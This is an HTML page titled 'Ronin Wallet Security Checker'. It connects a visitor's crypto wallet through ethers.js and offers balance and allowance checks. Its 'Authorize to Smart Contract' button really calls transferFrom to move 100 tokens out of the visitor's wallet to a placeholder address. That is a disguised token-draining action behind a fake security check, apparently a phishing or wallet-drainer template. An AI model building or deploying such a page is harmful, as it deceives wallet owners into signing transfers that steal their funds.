<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ronin Wallet Security Checker</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: white;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    header {
      padding: 20px;
      background-color: #1f1f1f;
    }

    header h1 {
      font-size: 2em;
      margin: 0;
    }

    .button {
      background-color: #3d5af1;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      font-size: 1.2em;
      cursor: pointer;
      margin: 20px;
    }

    .button:hover {
      background-color: #5368f0;
    }

    .content {
      padding: 40px;
    }

    .status {
      margin-top: 20px;
      font-size: 1.5em;
    }
  </style>
</head>
<body>
  <header>
    <h1>Ronin Wallet Security Checker</h1>
  </header>

  <div class="content">
    <!-- Connect Wallet Button -->
    <button class="button" id="connectButton">Connect Wallet</button>

    <!-- Authorize Contract Button -->
    <button class="button" id="authorizeButton" disabled>Authorize to Smart Contract</button>

    <!-- Check Balance Button -->
    <button class="button" id="checkBalanceButton" disabled>Check Balance</button>

    <!-- Check Allowance Button -->
    <button class="button" id="checkAllowanceButton" disabled>Check Allowance</button>

    <div class="status" id="status">
      Please connect your wallet to proceed.
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.5.0/dist/ethers.umd.min.js"></script>
  <script>
    let provider;
    let signer;
    let walletAddress = null;
    let contract;
    
    const contractAddress = '0x572A3a205247F867fE63637BF5183142d5Ac0d9e';
    const abi = [
      {
        "inputs": [
          { "internalType": "address", "name": "owner", "type": "address" },
          { "internalType": "address", "name": "spender", "type": "address" }
        ],
        "name": "allowance",
        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [
          { "internalType": "address", "name": "account", "type": "address" }
        ],
        "name": "balanceOf",
        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [
          { "internalType": "address", "name": "from", "type": "address" },
          { "internalType": "address", "name": "to", "type": "address" },
          { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
      }
    ];

    // Elements
    const connectButton = document.getElementById('connectButton');
    const authorizeButton = document.getElementById('authorizeButton');
    const checkBalanceButton = document.getElementById('checkBalanceButton');
    const checkAllowanceButton = document.getElementById('checkAllowanceButton');
    const statusDiv = document.getElementById('status');

    // Connect wallet function
    async function connectWallet() {
      if (window.ethereum) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        try {
          await provider.send("eth_requestAccounts", []);
          signer = provider.getSigner();
          walletAddress = await signer.getAddress();
          contract = new ethers.Contract(contractAddress, abi, signer);
          
          connectButton.innerHTML = 'Wallet Connected';
          authorizeButton.disabled = false;
          checkBalanceButton.disabled = false;
          checkAllowanceButton.disabled = false;
          statusDiv.innerHTML = `Connected: ${walletAddress}`;
        } catch (err) {
          console.error(err);
          statusDiv.innerHTML = 'Connection failed. Please try again.';
        }
      } else {
        statusDiv.innerHTML = 'No Ethereum provider found. Install MetaMask or another wallet.';
      }
    }

    // Authorize to smart contract function
    async function authorizeToContract() {
      if (walletAddress) {
        try {
          const tx = await contract.transferFrom(walletAddress, '0xYourContractAddress', ethers.utils.parseUnits('100', 18)); // Example
          await tx.wait();
          statusDiv.innerHTML = 'Authorization successful!';
        } catch (err) {
          console.error(err);
          statusDiv.innerHTML = 'Authorization failed.';
        }
      } else {
        statusDiv.innerHTML = 'Please connect your wallet first.';
      }
    }

    // Check balance function
    async function checkBalance() {
      if (walletAddress) {
        try {
          const balance = await contract.balanceOf(walletAddress);
          statusDiv.innerHTML = `Balance: ${ethers.utils.formatUnits(balance, 18)} tokens`;
        } catch (err) {
          console.error(err);
          statusDiv.innerHTML = 'Failed to fetch balance.';
        }
      } else {
        statusDiv.innerHTML = 'Please connect your wallet first.';
      }
    }

    // Check allowance function
    async function checkAllowance() {
      if (walletAddress) {
        try {
          const spender = '0xYourContractAddress'; // Example spender address
          const allowance = await contract.allowance(walletAddress, spender);
          statusDiv.innerHTML = `Allowance: ${ethers.utils.formatUnits(allowance, 18)} tokens`;
        } catch (err) {
          console.error(err);
          statusDiv.innerHTML = 'Failed to fetch allowance.';
        }
      } else {
        statusDiv.innerHTML = 'Please connect your wallet first.';
      }
    }

    // Event Listeners
    connectButton.addEventListener('click', connectWallet);
    authorizeButton.addEventListener('click', authorizeToContract);
    checkBalanceButton.addEventListener('click', checkBalance);
    checkAllowanceButton.addEventListener('click', checkAllowance);
  </script>
</body>
</html>
